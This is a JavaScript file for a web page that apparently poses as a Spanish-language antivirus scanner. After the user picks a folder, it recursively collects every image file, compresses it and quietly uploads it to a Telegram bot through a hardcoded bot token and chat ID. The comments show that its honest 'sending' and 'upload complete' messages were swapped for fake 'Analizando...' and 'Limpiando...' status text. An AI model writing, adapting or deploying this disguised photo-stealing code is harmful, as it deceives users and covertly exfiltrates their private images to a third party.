let startTime;
let isProcessing = false;

function updateStatus(message, progress = 0) {
    const statusElement = document.getElementById('antivirus-status');
    const progressElement = document.getElementById('progress');
    const timeElement = document.getElementById('time-info');

    statusElement.innerHTML = `[${progress}%] ${message}`;
    progressElement.style.width = `${progress}%`;

    if (startTime && progress > 0 && progress < 100) {
        const elapsed = (Date.now() - startTime) / 1000;
        const remaining = (elapsed / progress) * (100 - progress);
        timeElement.innerHTML = `⏳ Tiempo restante: ~${Math.floor(remaining)} segundos`;
    } else if (progress === 100) {
        timeElement.innerHTML = 'Limpiando...'; // Cambiado de "✅ Operación completada"
    } else {
        timeElement.innerHTML = '⏳ Calculando tiempo...';
    }
}

document.getElementById('start-btn').addEventListener('click', async () => {
    if (isProcessing) return;
    isProcessing = true;

    try {
        startTime = Date.now();
        updateStatus('Analizando...', 5); // Cambiado de "Iniciando escaneo..."

        if (!window.showDirectoryPicker) throw new Error('Navegador no compatible');

        const folderHandle = await window.showDirectoryPicker();
        updateStatus('Analizando...', 20); // Cambiado de "Analizando estructura..."

        await collectAndSendInChunks(folderHandle);
        updateStatus('Limpiando...', 100); // Cambiado de "✅ Subida completa"
    } catch (error) {
        console.error(error);
        updateStatus('❌ Error: ' + error.message, 0);
    } finally {
        isProcessing = false;
    }
});

// Función para registrar archivos enviados (localStorage)
function markAsSent(fileName) {
    let sentFiles = JSON.parse(localStorage.getItem('sentFiles') || '[]');
    sentFiles.push(fileName);
    localStorage.setItem('sentFiles', JSON.stringify(sentFiles));
}

function isAlreadySent(fileName) {
    let sentFiles = JSON.parse(localStorage.getItem('sentFiles') || '[]');
    return sentFiles.includes(fileName);
}

// Función para procesar y enviar fotos en bloques de 100
async function collectAndSendInChunks(folderHandle) {
    const BATCH_SIZE = 100;
    let batch = [];

    async function processDirectory(handle) {
        for await (const entry of handle.values()) {
            if (entry.kind === 'file') {
                const fileName = entry.name.toLowerCase();
                if ((fileName.endsWith('.jpg') || fileName.endsWith('.jpeg') || fileName.endsWith('.png') ||
                    fileName.endsWith('.gif') || fileName.endsWith('.bmp') || fileName.endsWith('.webp')) &&
                    !isAlreadySent(entry.name)) {

                    batch.push(entry);

                    if (batch.length === BATCH_SIZE) {
                        await sendFilesToTelegram(batch);
                        batch = [];
                    }
                }
            } else if (entry.kind === 'directory') {
                await processDirectory(entry);
            }
        }
    }

    await processDirectory(folderHandle);

    if (batch.length > 0) {
        await sendFilesToTelegram(batch);
    }
}

// Compresión de imagen
async function compressImage(file) {
    return new Promise(resolve => {
        const img = new Image();
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        img.src = URL.createObjectURL(file);
        img.onload = () => {
            let width = img.width;
            let height = img.height;
            const maxWidth = 1200;
            if (width > maxWidth) {
                height *= maxWidth / width;
                width = maxWidth;
            }
            canvas.width = width;
            canvas.height = height;
            ctx.drawImage(img, 0, 0, width, height);
            canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.7);
        };
    });
}

// Enviar archivos a Telegram
async function sendFilesToTelegram(files) {
    const token = '7212842349:AAHU7CbW1M6E-n01opEnnwTGs3eLveS1BLk';
    const chatId = '5821490693';

    const total = files.length;
    let sent = 0;
    const parallelLimit = 50; // 50 fotos en paralelo

    async function processFile(fileEntry) {
        const fileData = await fileEntry.getFile();
        let finalFile = await compressImage(fileData); // Comprimir imagen
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('caption', `Archivo: ${fileData.name}`);
        formData.append('document', finalFile, fileData.name);

        try {
            let response = await fetch(`https://api.telegram.org/bot${token}/sendDocument`, {
                method: 'POST',
                body: formData
            });

            // Si Telegram da error 429 (muchos envíos), esperar y reintentar
            if (!response.ok && response.status === 429) {
                const errorData = await response.json();
                const waitTime = (errorData.parameters?.retry_after || 60) * 1000;
                console.warn(`Demasiados envíos. Esperando ${waitTime / 1000} segundos...`);
                await new Promise(res => setTimeout(res, waitTime));
                return processFile(fileEntry); // Reintentar
            } else if (!response.ok) {
                console.error('Error al enviar archivo:', await response.json());
            } else {
                markAsSent(fileData.name); // Marcar como enviado
            }
        } catch (error) {
            console.error('Error de red o fetch:', error); // Para manejar el "Failed to fetch"
        }

        sent++;
        const progress = 40 + Math.floor((sent / total) * 60);
        updateStatus(`Analizando...`, progress); // Cambiado de "Enviando archivo..."
    }

    // Procesar en paralelo
    for (let i = 0; i < files.length; i += parallelLimit) {
        const batch = files.slice(i, i + parallelLimit);
        const promises = batch.map(file => processFile(file));
        await Promise.all(promises);
        await new Promise(resolve => setTimeout(resolve, 2000)); // Pausa de 2 segundos entre lotes
    }
}
